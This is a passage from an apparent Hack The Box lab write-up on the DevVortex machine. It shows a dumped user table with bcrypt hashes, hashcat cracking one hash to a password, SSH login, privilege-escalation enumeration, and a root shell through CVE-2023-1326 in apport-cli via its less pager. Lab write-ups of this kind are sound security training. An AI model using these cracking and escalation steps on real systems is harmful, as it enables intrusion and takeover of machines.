+-------------------------------+
71 rows in set (0.01 sec)

mysql> select * from sd4fg_users;
select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2026-09-20 13:06:43 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
```

<p class="mb-5"><strong>Answer:</strong> sd4fg_users</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> What is the logan user's password on DevVortex?</p>
<p class="mb-3">We can see the password hash (<code>$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12</code>) for the user <code>logan</code>. We will use hashid to identify the type of hash it is, then use hashcat to crack the hash.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > hash.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7543 32-Core Processor, 3921/7907 MB (988 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC 7543 32-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
Time.Started.....: Sun Sep 20 09:33:06 2026 (18 secs)
Time.Estimated...: Sun Sep 20 09:33:24 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       79 H/s (6.21ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1408/14344385 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1392/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#1....: moises -> tagged

Started: Sun Sep 20 09:32:57 2026
Stopped: Sun Sep 20 09:33:25 2026
```

<p class="mb-3">Logan's password turns out to be <code>tequieromucho</code>.</p>
<p class="mb-5"><strong>Answer:</strong> tequieromucho</p>
<br />


<p class="mb-2"><strong>Question 9:</strong> Submit the flag located in the logan user's home directory.</p>
<p class="mb-3">Remembering that we found port 22 (SSH) to be open earlier from the Nmap scan, we attempt to login with the credentials <code>logan</code>:<code>tequieromucho</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-txf7zq0chk]─[~]
└──╼ [★]$ ssh logan@10.129.229.146
The authenticity of host '10.129.229.146 (10.129.229.146)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.146' (ED25519) to the list of known hosts.
logan@10.129.229.146's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 20 Sep 2026 01:49:29 PM UTC

  System load:  0.0               Processes:             169
  Usage of /:   67.1% of 4.76GB   Users logged in:       0
  Memory usage: 19%               IPv4 address for eth0: 10.129.229.146
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
logan@devvortex:~$ whoami
logan
logan@devvortex:~$ id
uid=1000(logan) gid=1000(logan) groups=1000(logan)
logan@devvortex:~$ ls
user.txt
logan@devvortex:~$ cat user.txt
bd47e9355674dc1db09af2b30b97b3b9
```

<p class="mb-5"><strong>Answer:</strong> bd47e9355674dc1db09af2b30b97b3b9</p>
<br />


<p class="mb-2"><strong>Question 10:</strong> What is the full path to the binary that the logan user can run with root privileges using sudo?</p>
<p class="mb-3">We use the one-liner <code>sudo -l; find / -perm -4000 2>/dev/null; getcap / -r 2>/dev/null</code> to do a quick check for privesc opportunities.</p>

```console
logan@devvortex:~$ sudo -l; find / -perm -4000 2>/dev/null; getcap / -r 2>/dev/null
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
```

<p class="mb-5"><strong>Answer:</strong> /usr/bin/apport-cli</p>
<br />


<p class="mb-2"><strong>Question 11:</strong> What is the 2023 CVE ID of the privilege escalation vulnerability in the installed version of apport-cli?</p>

```console
logan@devvortex:~$ /usr/bin/apport-cli --version
2.20.11
```

<p class="mb-3">Doing an internet search reveals that is version 2.20.11 is installed, an unprivileged user may privesc to root if they are allowed to run it with <code>sudo</code>. This is because apport-cli invokes a pager (such as <code>less</code>) when viewing a crash, which can be used to run system commands in the context of the user executing the parent command. IN this case, if ran using <code>sudo</code>, it can be used to spawn an interactive system shell, as the elevated privileges are not dropped.</p>
<p class="mb-5"><strong>Answer:</strong> CVE-2023-1326</p>
<br />


<p class="mb-2"><strong>Question 12:</strong> Submit the flag located in the root user's home directory.</p>
<p class="mb-3">To exploit the vulnerability, first we need to find a way to trigger the pager. We start by listing all the running processes and can then attempt to report a problem using <code>apport-cli</code> in <code>--file-bug</code> mode.</p>

```console
logan@devvortex:~$ ps -ux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
logan       1567  0.0  0.2  19040  9400 ?        Ss   13:49   0:00 /lib/systemd/systemd --user
logan       1570  0.0  0.0 169180  3256 ?        S    13:49   0:00 (sd-pam)
logan       1671  0.0  0.1  14060  5332 ?        S    13:49   0:00 sshd: logan@pts/1
logan       1673  0.0  0.1   8272  5120 pts/1    Ss   13:49   0:00 -bash
logan       1726  0.0  0.0   9080  3492 pts/1    R+   13:57   0:00 ps -ux
```

<p class="mb-3">We will be using the process ID (<code>PID</code>) of <code>systemd</code> which is 1567 in my case. We now run apport-cli using <code>sudo</code>, specifying the PID using the <code>-P</code> flag and <code>file-bug</code> mode using the <code>-f</code> flag. The tool will then gather information and report any issues with that process, prompting us to pick what to do with the report. We proceed to select <code>V: View report</code>, and since <code>less</code> is configured as the default pager, we then run the <code>!/bin/bash</code> command and spawn an interactive system shell as the root user.</p>

```console
logan@devvortex:~$ sudo /usr/bin/apport-cli -f -P 1567

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
..........
*** It seems you have modified the contents of "/etc/systemd/journald.conf".  Would you like to add the contents of it to your bug report?


What would you like to do? Your options are:
  Y: Yes
  N: No
  C: Cancel
Please choose (Y/N/C): Y

*** It seems you have modified the contents of "/etc/systemd/resolved.conf".  Would you like to add the contents of it to your bug report?


What would you like to do? Your options are:
  Y: Yes
  N: No
  C: Cancel
Please choose (Y/N/C): y
..............

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (736.0 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
root@devvortex:/home/logan# id
uid=0(root) gid=0(root) groups=0(root)
root@devvortex:/home/logan# cd /root && ls
root.txt
root@devvortex:~# cat root.txt
e35b187f0e30ceff37ab7f13f35642a8
```

<p class="mb-5"><strong>Answer:</strong> e35b187f0e30ceff37ab7f13f35642a8</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>